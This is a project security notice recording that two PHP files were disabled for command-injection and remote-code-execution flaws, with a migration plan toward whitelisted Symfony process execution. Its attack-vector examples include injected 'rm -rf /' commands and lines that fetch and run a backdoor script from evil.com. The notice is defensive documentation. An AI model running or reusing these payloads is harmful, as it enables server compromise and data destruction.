# Disabled Files - Security Notice

**Date Disabled:** November 26, 2025  
**Reason:** Critical Remote Code Execution (RCE) vulnerabilities  
**Status:** DISABLED - DO NOT RE-ENABLE WITHOUT SECURITY REVIEW

---

## Files Disabled

### 1. `run_python_command.php.DISABLED`

**Original File:** `run_python_command.php`  
**Severity:** 🔴 CRITICAL - Remote Code Execution (RCE)  
**CVE Risk Level:** 10.0/10 (Critical)

#### Vulnerability Details

**Location:** Line 165  
**Issue:** User input passed directly to `shell_exec()` without proper sanitization

```php
// DANGEROUS CODE:
$output = shell_exec($full . ' 2>&1');
```

**Attack Vector:**
```bash
# Attacker could inject commands like:
command=analysis.py; rm -rf / #
command=analysis.py & wget evil.com/backdoor.sh -O /tmp/x.sh && bash /tmp/x.sh
```

**Impact:**
- Full server compromise
- Data exfiltration
- Malware installation
- Privilege escalation
- Database access

#### Why This Was Vulnerable

1. **Direct Shell Execution:** `shell_exec()` executes commands in a shell, allowing command chaining
2. **Insufficient Sanitization:** Basic sanitization cannot prevent all injection vectors
3. **No Command Whitelist:** Any Python script could be executed
4. **No Authentication:** File was accessible without proper auth checks
5. **No CSRF Protection:** Cross-site request forgery possible

### 2. `automation.php.DISABLED`

**Original File:** `automation.php`  
**Severity:** 🔴 CRITICAL - Remote Code Execution (RCE)  
**CVE Risk Level:** 10.0/10 (Critical)

#### Vulnerability Details

**Location:** Lines 113-114  
**Issue:** Exposed Python code execution via web interface

```php
// DANGEROUS CODE:
python -c "import os; os.system('taskkill /f /im python.exe')"
<button onclick="runPy('-c \"import os; os.system(\\'taskkill /f /im python.exe\\')\"')">
```

**Attack Vector:**
```python
# Attacker could execute arbitrary Python code:
python -c "import os; os.system('rm -rf /')"
python -c "__import__('os').system('curl evil.com/backdoor.sh | bash')"
```

**Impact:**
- Remote code execution
- System process termination
- File system manipulation
- Network attacks
- Botnet installation

#### Why This Was Vulnerable

1. **Python Code Injection:** Allows arbitrary Python code execution via `-c` flag
2. **No Input Validation:** User can provide any Python code
3. **System Command Access:** Python's `os.system()` grants full shell access
4. **Web-Based Interface:** Easy to exploit via browser/curl
5. **No Rate Limiting:** Automated attacks possible

---

## Secure Replacements

### ✅ Use Instead: `app/Api/execute_command.php`

**Security Features:**
- ✅ Strict command whitelist
- ✅ CSRF token protection
- ✅ Session-based authentication
- ✅ Input validation using Symfony Validator
- ✅ Process execution via Symfony Process (no shell)
- ✅ Comprehensive logging
- ✅ Rate limiting ready

**Example Usage:**
```php
// Secure command execution
POST /app/Api/execute_command.php
{
    "command_key": "update_portfolio",
    "csrf_token": "abc123..."
}

// Whitelist definition:
$allowedCommands = [
    'update_portfolio' => ['python', 'scripts/update_portfolio.py'],
    'sync_data' => ['python', 'scripts/sync_data.py']
];
```

---

## Migration Plan

### Phase 1: Immediate Actions ✅ COMPLETE

- [x] Disable `run_python_command.php`
- [x] Disable `automation.php`
- [x] Create this documentation

### Phase 2: Implement Symfony Security (In Progress)

- [ ] Install `symfony/validator` and `symfony/process`
- [ ] Create `app/Security/ProcessManager.php` using Symfony Process
- [ ] Create `app/Security/InputSanitizer.php` using Symfony Validator
- [ ] Create `app/Security/CsrfManager.php` using Symfony CsrfTokenManager
- [ ] Update `app/Api/execute_command.php` to use new security classes

### Phase 3: Testing

- [ ] Run security tests: `vendor/bin/phpunit tests/Security/`
- [ ] Penetration testing for command injection
- [ ] Verify CSRF protection
- [ ] Load testing for rate limiting

### Phase 4: Deployment

- [ ] Update all references to old files
- [ ] Add security headers to Apache/Nginx config
- [ ] Enable Web Application Firewall (WAF)
- [ ] Monitor logs for exploitation attempts

---

## Re-Enabling These Files

⚠️ **DO NOT RE-ENABLE THESE FILES WITHOUT:**

1. **Security Review:** Full code audit by security professional
2. **Penetration Testing:** Verified no RCE vulnerabilities remain
3. **Symfony Implementation:** Using battle-tested security components
4. **WAF Protection:** Web Application Firewall in place
5. **Monitoring:** Real-time attack detection
6. **Authorization:** Management approval with security sign-off

---

## Security Contact

If you need to execute Python commands securely:

1. **Use:** `app/Api/execute_command.php` with whitelisted commands
2. **Review:** `SYMFONY_SECURITY_IMPLEMENTATION.md` for proper patterns
3. **Test:** Run security test suite before any changes
4. **Document:** All changes to command whitelist

---

## References

- **OWASP Top 10:** A03:2021 – Injection
- **CWE-78:** Improper Neutralization of Special Elements used in an OS Command
- **CVE Database:** Similar vulnerabilities scored 9.8-10.0 (Critical)
- **Security Documentation:** `COMPREHENSIVE_CODE_REVIEW.md` Part 1, Issues 1-2

---

**Last Updated:** November 26, 2025  
**Status:** Files remain disabled pending Symfony security implementation
